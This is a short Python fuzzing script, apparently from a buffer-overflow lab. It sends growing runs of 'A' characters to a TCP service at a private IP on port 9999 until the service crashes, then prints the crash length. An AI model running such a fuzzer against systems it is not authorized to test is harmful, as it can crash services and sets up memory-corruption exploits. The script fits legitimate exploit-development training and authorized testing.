#!/usr/bin/python3

import socket, time, sys

ip = "10.37.1.149"	# Change to IP Host
port = 9999		# Change to Port Host
timeout = 5

string = "A" * 100

print("##### Starting Fuzzing #####")
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string + "\r\n", "latin-1"))
      s.recv(1024)
  except:
    print("##### End of Fuzzing #####")
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
